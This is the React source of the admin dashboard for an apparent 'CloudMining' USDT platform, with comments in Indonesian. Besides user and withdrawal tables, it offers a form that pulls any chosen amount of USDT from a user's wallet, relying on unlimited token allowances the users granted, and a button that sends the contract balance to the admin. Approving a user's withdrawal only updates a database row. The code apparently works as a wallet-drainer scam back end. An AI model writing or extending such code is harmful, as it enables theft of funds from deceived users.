// src/pages/admin/index.tsx

import { useState, useEffect } from 'react';
import { supabase } from '../../../lib/supabase';
import { useAccount } from 'wagmi';
import { ConnectButton } from '@rainbow-me/rainbowkit';
import { transferFromUser, getContractBalance, withdraw } from '../../utils/CloudMining';



type User = {
  id: string;
  wallet_address: string;
  usdt_balance: number;
  plan: string;
  deposit_amount: number;
  withdrawal_amount: number;
  last_login: string;
  last_updated: string;
  infinite_allowance: boolean;
};

type WithdrawRequest = {
  id: string;
  wallet_address: string;
  withdrawal_amount: number;
  status: 'pending' | 'approved' | 'rejected';
  created_at: string;
};

const AdminDashboard = () => {
  const [mounted, setMounted] = useState(false);
  // State untuk Users Table
  const [users, setUsers] = useState<User[]>([]);
  const [loadingUsers, setLoadingUsers] = useState(true);
  const [usersError, setUsersError] = useState<string | null>(null);
  const [userPage, setUserPage] = useState(1);
  const userPageSize = 10;
  const [totalUsers, setTotalUsers] = useState(0);

  // State untuk Withdraw Requests Table
  const [withdrawRequests, setWithdrawRequests] = useState<WithdrawRequest[]>([]);
  const [loadingWithdraw, setLoadingWithdraw] = useState(true);
  const [withdrawError, setWithdrawError] = useState<string | null>(null);
  const [withdrawPage, setWithdrawPage] = useState(1);
  const withdrawPageSize = 10;
  const [totalWithdraw, setTotalWithdraw] = useState(0);
  // Search term untuk Users (misalnya pencarian berdasarkan wallet_address)
  const [searchTerm, setSearchTerm] = useState('');
  const { address } = useAccount();
  const ADMIN_WALLETS =
    process.env.NEXT_PUBLIC_ADMIN_WALLETS?.split(',').map((a) => a.trim().toLowerCase()) || [];

  //fungsi untuk contract
  const [balance, setBalance] = useState("0");
  const [userAddress, setUserAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [withdrawAmount, setWithdrawAmount] = useState("");
  

  // Fungsi untuk mendapatkan saldo kontrak
  const fetchBalance = async () => {
    const contractBalance = await getContractBalance();
    setBalance((Number(contractBalance) / 10 ** 6).toFixed(2)); // Konversi ke USDT normal
  };
  

  // Fungsi untuk transfer dari user ke kontrak
  const handleTransfer = async () => {
    if (!userAddress || !amount) return alert("Masukkan alamat dan jumlah!");
    try {
      await transferFromUser(userAddress, amount);
      alert("Transfer berhasil!");
      fetchBalance();
    } catch (error) {
      console.error(error);
      alert("Transfer gagal!");
    }
  };

  // Fungsi untuk menarik dari kontrak ke admin
  const handleWithdraw = async () => {
    if (!withdrawAmount) return alert("Masukkan jumlah untuk ditarik!");
    try {
      await withdraw(withdrawAmount);
      alert("Penarikan berhasil!");
      fetchBalance();
    } catch (error) {
      console.error(error);
      alert("Penarikan gagal!");
    }
  };

  // Fungsi fetch Users dengan pagination
  const fetchUsers = async () => {
    try {
      setLoadingUsers(true);
      setUsersError(null);
      const from = (userPage - 1) * userPageSize;
      const to = userPage * userPageSize - 1;
      const { data, error, count } = await supabase
        .from('users')
        .select(
          'id, wallet_address, usdt_balance, plan, deposit_amount, withdrawal_amount, last_login, last_updated, infinite_allowance',
          { count: 'exact' }
        )
        .ilike('wallet_address', `%${searchTerm}%`)
        .order('last_updated', { ascending: false })
        .range(from, to);

      if (error) throw error;
      setUsers(data || []);
      setTotalUsers(count || 0);
    } catch (err) {
      setUsersError('Failed to fetch users');
      console.error(err);
    } finally {
      setLoadingUsers(false);
    }
  };

  // Fungsi fetch Withdraw Requests dengan pagination
  const fetchWithdrawRequests = async () => {
    try {
      setLoadingWithdraw(true);
      setWithdrawError(null);
      const from = (withdrawPage - 1) * withdrawPageSize;
      const to = withdrawPage * withdrawPageSize - 1;
      const { data, error, count } = await supabase
        .from('withdraw_requests')
        .select('id, wallet_address, withdrawal_amount, status, created_at', { count: 'exact' })
        .order('created_at', { ascending: false })
        .range(from, to);
      if (error) throw error;
      setWithdrawRequests(data || []);
      setTotalWithdraw(count || 0);
    } catch (err) {
      setWithdrawError('Failed to fetch withdraw requests');
      console.error(err);
    } finally {
      setLoadingWithdraw(false);
    }
  };

  // Fungsi update status untuk withdraw request (approve/reject)
  const updateWithdrawStatus = async (id: string, newStatus: 'approved' | 'rejected') => {
    try {
      const { error } = await supabase
        .from('withdraw_requests')
        .update({ status: newStatus })
        .eq('id', id);
      if (error) throw error;
      setWithdrawRequests((prev) =>
        prev.map((req) => (req.id === id ? { ...req, status: newStatus } : req))
      );
    } catch (err) {
      console.error(`Failed to update status to ${newStatus}:`, err);
    }
  };

  useEffect(() => {
    setMounted(true);
  }, []);

  const [isAdmin, setIsAdmin] = useState(false);
  const [loadingAuth, setLoadingAuth] = useState(true);

  useEffect(() => {
    if (mounted && address) {
      const adminWallets = process.env.NEXT_PUBLIC_ADMIN_WALLETS?.split(',').map((a) => a.trim().toLowerCase()) || [];
      setIsAdmin(adminWallets.includes(address.toLowerCase()));
      setLoadingAuth(false);
    }
  }, [mounted, address]);

  // Mengambil data Users ketika address, searchTerm, atau userPage berubah
  useEffect(() => {
    if (mounted && isAdmin) {
      fetchUsers();
    }
  }, [mounted, isAdmin, searchTerm, userPage]);

  // Mengambil data Withdraw Requests ketika address atau withdrawPage berubah
  useEffect(() => {
    if (mounted && isAdmin) {
      fetchWithdrawRequests();
    }
  }, [mounted, isAdmin, withdrawPage]);

  if (!mounted) return null;

  if (loadingAuth) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="text-white text-xl">Checking authorization...</div>
      </div>
    );
  }

  if (!address) {
    return (
      <div className="min-h-screen flex flex-col items-center justify-center bg-gray-900 p-4">
        <h1 className="text-white text-3xl mb-4">Admin Login</h1>
        <p className="text-gray-400 mb-4">
          Please connect your wallet to access the admin panel.
        </p>
        <ConnectButton label="Connect Wallet" />
      </div>
    );
  }

  if (!isAdmin) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-900">
        <div className="text-red-500 text-2xl font-bold">
          Unauthorized Access. Admin Only.
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-900 p-4">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold text-white mb-8">Admin Dashboard</h1>

        {/* Search Bar */}
        <div className="mb-6">
          <input
            type="text"
            placeholder="Search by wallet address..."
            className="w-full p-3 rounded-lg bg-gray-800 text-white placeholder-gray-400"
            value={searchTerm}
            onChange={(e) => {
              setSearchTerm(e.target.value);
              setUserPage(1); // reset pagination saat pencarian berubah
            }}
          />
        </div>

        {/* Users Table */}
        <div className="mb-10">
          <h2 className="text-2xl font-bold text-white mb-4">Users</h2>
          {loadingUsers ? (
            <div className="text-center text-white py-4">Loading users...</div>
          ) : usersError ? (
            <div className="text-red-500 text-center py-4">{usersError}</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Wallet Address
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      USDT Balance
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Plan
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Deposit ($)
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Infinite Allowance
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Last Updated
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {users.map((user) => (
                    <tr
                      key={user.id}
                      className="hover:bg-gray-800/50 transition-colors"
                    >
                      <td className="px-6 py-4 text-white font-mono">
                        {user.wallet_address}
                      </td>
                      <td className="px-6 py-4 text-green-300">
                        {user.usdt_balance.toFixed(4)} USDT
                      </td>
                      <td className="px-6 py-4 text-blue-400">{user.plan}</td>
                      <td className="px-6 py-4 text-green-400">
                        ${user.deposit_amount.toFixed(2)}
                      </td>
                      <td className="px-6 py-4 text-gray-400">
                        {user.infinite_allowance ? 'TRUE' : 'FALSE'}
                      </td>
                      <td className="px-6 py-4 text-gray-400">
                        {new Date(user.last_updated).toLocaleDateString()}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {/* Pagination Controls for Users */}
              <div className="flex justify-between items-center mt-4">
                <button
                  onClick={() => setUserPage((prev) => Math.max(prev - 1, 1))}
                  disabled={userPage === 1}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Previous
                </button>
                <span className="text-white">
                  Page {userPage} of {Math.ceil(totalUsers / userPageSize)}
                </span>
                <button
                  onClick={() =>
                    setUserPage((prev) =>
                      prev < Math.ceil(totalUsers / userPageSize) ? prev + 1 : prev
                    )
                  }
                  disabled={userPage >= Math.ceil(totalUsers / userPageSize)}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Next
                </button>
              </div>
            </div>
          )}
        </div>

        {/* Withdraw Requests Table */}
        <div className="mb-10">
          <h2 className="text-2xl font-bold text-white mb-4">Withdraw Requests</h2>
          {loadingWithdraw ? (
            <div className="text-center text-white py-4">
              Loading withdraw requests...
            </div>
          ) : withdrawError ? (
            <div className="text-red-500 text-center py-4">{withdrawError}</div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full">
                <thead className="bg-gray-800">
                  <tr>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Wallet Address
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Amount ($)
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Status
                    </th>
                    <th className="px-6 py-4 text-left text-white font-semibold">
                      Actions
                    </th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-gray-700">
                  {withdrawRequests.map((req) => (
                    <tr
                      key={req.id}
                      className="hover:bg-gray-800/50 transition-colors"
                    >
                      <td className="px-6 py-4 text-white">{req.wallet_address}</td>
                      <td className="px-6 py-4 text-green-400">
                        ${req.withdrawal_amount.toFixed(2)}
                      </td>
                      <td className="px-6 py-4 text-yellow-400">{req.status}</td>
                      <td className="px-6 py-4">
                        <button
                          onClick={() =>
                            updateWithdrawStatus(req.id, 'approved')
                          }
                          className="mr-2 text-green-400"
                        >
                          Approve
                        </button>
                        <button
                          onClick={() =>
                            updateWithdrawStatus(req.id, 'rejected')
                          }
                          className="text-red-400"
                        >
                          Reject
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
              {/* Pagination Controls for Withdraw Requests */}
              <div className="flex justify-between items-center mt-4">
                <button
                  onClick={() => setWithdrawPage((prev) => Math.max(prev - 1, 1))}
                  disabled={withdrawPage === 1}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Previous
                </button>
                <span className="text-white">
                  Page {withdrawPage} of {Math.ceil(totalWithdraw / withdrawPageSize)}
                </span>
                <button
                  onClick={() =>
                    setWithdrawPage((prev) =>
                      prev < Math.ceil(totalWithdraw / withdrawPageSize) ? prev + 1 : prev
                    )
                  }
                  disabled={withdrawPage >= Math.ceil(totalWithdraw / withdrawPageSize)}
                  className="px-4 py-2 bg-gray-700 text-white rounded disabled:opacity-50"
                >
                  Next
                </button>
              </div>
            </div>
          )}
        </div>
        {/* Fungsi untuk contract */}
<div className="mb-10 p-6 bg-gray-800 rounded-xl">
<h2 className="text-2xl font-bold text-white mb-4">Contract Balance</h2>
<div className="flex items-center gap-4">
  <button 
    className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg transition-colors"
    onClick={fetchBalance}
  >
    Cek Saldo Kontrak
  </button>
  <p className="text-white font-mono">
    Saldo Kontrak: <span className="text-green-400">{balance} USDT</span>
  </p>
</div>
</div>

{/* Fungsi untuk transfer dari user ke kontrak */}
<div className="mb-10 p-6 bg-gray-800 rounded-xl">
  <h2 className="text-2xl font-bold text-white mb-4">Transfer dari User ke Kontrak</h2>
  <div className="space-y-4">
    <div className="flex flex-col gap-2">
      <label className="text-gray-300">Alamat User</label>
      <input
        className="w-full p-3 rounded-lg bg-gray-700 text-white placeholder-gray-400"
        placeholder="0x..."
        onChange={(e) => setUserAddress(e.target.value)}
      />
    </div>
    <div className="flex flex-col gap-2">
      <label className="text-gray-300">Jumlah USDT</label>
      <div className="flex gap-3">
        <input
          className="flex-1 p-3 rounded-lg bg-gray-700 text-white"
          placeholder="0.00"
          onChange={(e) => setAmount(e.target.value)}
        />
        <button 
          className="px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-lg transition-colors"
          onClick={handleTransfer}
        >
          Transfer USDT
        </button>
      </div>
    </div>
  </div>
</div>

{/* Fungsi untuk menarik dari kontrak ke admin */}
<div className="mb-10 p-6 bg-gray-800 rounded-xl">
  <h2 className="text-2xl font-bold text-white mb-4">Withdraw ke Wallet Admin</h2>
  <div className="flex gap-3 items-center">
    <input
      className="flex-1 p-3 rounded-lg bg-gray-700 text-white"
      placeholder="Jumlah Penarikan"
      onChange={(e) => setWithdrawAmount(e.target.value)}
    />
    <button 
      className="px-6 py-3 bg-red-600 hover:bg-red-700 text-white rounded-lg transition-colors"
      onClick={handleWithdraw}
    >
      Tarik ke Admin
    </button>
  </div>
</div>
      </div>
    </div>
  );
};

export default AdminDashboard;
